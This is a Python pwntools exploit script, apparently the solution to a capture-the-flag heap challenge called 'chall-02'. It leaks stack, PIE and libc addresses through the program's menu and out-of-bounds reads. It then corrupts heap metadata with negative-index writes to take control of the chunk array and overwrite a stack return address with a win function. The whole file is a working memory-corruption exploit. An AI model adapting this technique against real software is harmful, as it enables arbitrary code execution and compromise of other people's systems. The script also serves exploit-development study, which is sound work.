from pwn import *

STACK_CHOICE = 0xd3
PIE_CHOICE = 0x83

target = process("./chall-02")
gdb.attach(target)

MENU_STRING = b"Please enter menu choice:\n"

# Our I/O Wrapper Functions
def allocate_new_chunk(chunk_size: int, chunk_idx: int) -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"1")
	target.recvuntil(b"Enter the chunk size between 0x0-0x5f0:\n")
	target.sendline(bytes(str(chunk_size), "utf-8"))
	target.recvuntil(b"Which chunk idx would you like to allocate?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))

def view_chunk(chunk_idx: int, view_idx: int) -> bytes:
	target.recvuntil(MENU_STRING)
	target.sendline(b"2")
	target.recvuntil(b"Which chunk idx would you like?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))
	target.recvuntil(b"What index would you like to see?\n")
	target.sendline(bytes(str(view_idx), "utf-8"))
	target.recvuntil(b"Chunk Contents: ")
	contents = target.recvuntil(b"\n")
	return int(contents, 0x10)

def edit_chunk(chunk_idx: int, write_idx: int, write_value: int) -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"3")
	target.recvuntil(b"Which chunk idx would you like?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))
	target.recvuntil(b"Please input long write index\n")
	target.sendline(bytes(str(write_idx), "utf-8"))
	target.recvuntil(b"Please input the write value\n")
	target.sendline(bytes(str(write_value), "utf-8"))

def free_chunk(chunk_idx: int) -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"4")
	target.recvuntil(b"Which chunk idx would you like?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))

def secret(chunk_idx: int, choice: int) -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"5")
	target.recvuntil(b"Which chunk idx would you like?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))
	target.recvuntil(b"Choice?\n")
	target.sendline(bytes(str(choice), "utf-8"))

# Allocate our starting 4 chunks
allocate_new_chunk(0x500, 0)

allocate_new_chunk(0x80, 1)

# Get the stack infoleak
secret(0, STACK_CHOICE)
stack_leak = view_chunk(0, 0)
print(hex(stack_leak))

secret(0, PIE_CHOICE)
pie_leak = view_chunk(0, 0)
print(hex(pie_leak))

pie_base = pie_leak - 0x1810
chunks_address = pie_base + 0x4040

stack_target_dst = stack_leak + 0x38

win_func = pie_base + 0x12db

free_chunk(0)

libc_leak = view_chunk(1, -162)
print(hex(libc_leak))

edit_chunk(1, -864, chunks_address)

edit_chunk(1, -886, 1)

allocate_new_chunk(0xa0, 0)

allocate_new_chunk(0x90, 2)

edit_chunk(2, 0, stack_target_dst)

edit_chunk(0, 0, win_func)

target.interactive()
